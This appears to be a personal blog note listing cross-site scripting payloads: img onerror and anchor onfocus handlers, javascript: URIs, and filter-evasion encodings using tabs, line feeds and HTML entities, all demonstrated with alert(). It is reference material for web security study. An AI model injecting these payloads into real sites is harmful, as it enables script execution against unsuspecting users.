---
title: XSS(Cross Site Scripting)
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---


## img tag onerror
~~~ html
<img src=x onerror="alert('XSS!')">
~~~

## a tag onfocus
~~~ html
<a autofocus name="example" onfocus="alert('XSS!')" href="javascript:alert('XSS!')">_</a>
<a name="example" onfocus="alert('XSS!')" href="javascript:alert('XSS!')">_</a> <!-- https://target.com/#example -->
~~~

## URI normalization

~~~ html
<!-- Insert TAB(&#9;) or LineFeed(&#10;) -->
<a href="j	avascript:a
lert(1);">Click Me!</a>

<!-- Insert HTML Entity(Encoded "javascript:alert(1);") -->
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3b;">Click Me!</a>
~~~
